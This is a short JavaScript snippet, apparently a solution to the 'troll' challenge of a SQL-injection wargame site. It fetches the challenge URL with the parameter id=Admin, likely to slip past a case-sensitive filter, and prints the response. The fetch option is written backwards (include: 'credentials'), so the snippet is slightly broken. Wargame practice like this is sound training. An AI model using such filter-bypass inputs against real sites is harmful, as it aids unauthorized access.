// On the chrome console window
fetch('https://los.rubiya.kr/chall/troll_05b5eb65d94daf81c42dd44136cb0063.php?id=Admin', {
    include: 'credentials'
  }
).then((x) => x.text()).then((x) => console.log(x));
